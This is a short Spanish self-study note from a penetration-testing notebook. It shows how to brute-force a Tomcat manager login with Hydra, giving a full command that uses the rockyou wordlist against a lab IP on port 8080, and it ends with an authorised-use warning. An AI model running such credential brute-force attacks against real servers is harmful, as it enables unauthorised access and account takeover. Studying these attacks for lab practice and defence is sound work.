---
title: "6 - Hydra - Ataque de Fuerza Bruta TomCat"
date: 2026-08-27
tags:
  - self-study
  - security-penetration-testing
  - avanzado
status: verified
author: "Juan José Restrepo Rosero"
last_updated: 2026-08-27
---

Podemos atacar el panel de login de un tomcat con hydra de la siguiente forma:
![[Pasted image 20240115120606.png]]
```bash
hydra -t 64 -l tomcat -P /usr/share/wordlists/rockyou.txt -f 192.168.0.43 -s 8080 http-get /manager/html
```
![[Pasted image 20240115120749.png]]

<!-- self-study-knowledge-context -->
## Contexto de estudio
- Dominio: [[MOC-Self-Study#Security & Penetration Testing|Seguridad y pruebas de penetración]].
- Criterio de producción: Ejecuta técnicas únicamente en activos propios o con autorización explícita, alcance documentado y controles de no afectación.
> [!warning] Uso autorizado
> Este material es exclusivamente educativo y defensivo. Practica en laboratorios aislados, CTFs o sistemas para los que dispongas de autorización previa y explícita.
